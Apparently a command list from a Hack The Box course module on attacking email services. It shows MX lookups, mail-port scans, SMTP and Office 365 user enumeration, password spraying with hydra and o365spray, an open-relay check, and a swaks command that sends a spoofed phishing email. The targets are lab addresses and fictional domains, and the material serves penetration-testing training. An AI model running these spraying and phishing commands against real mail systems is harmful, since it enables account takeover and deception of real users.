...
```shell-session
0xxNosystemisSafe@htb[/htb]$ host -t MX hackthebox.eu
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ host -t MX microsoft.com
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ host -t A mail1.inlanefreight.htb.
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ telnet 10.10.110.20 25
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ telnet 10.10.110.20 110
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
...
```shell-session
0xxNosystemisSafe@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
...
```shell-session
0xxNosystemisSafe@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
...
```shell-session
0xxNosystemisSafe@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
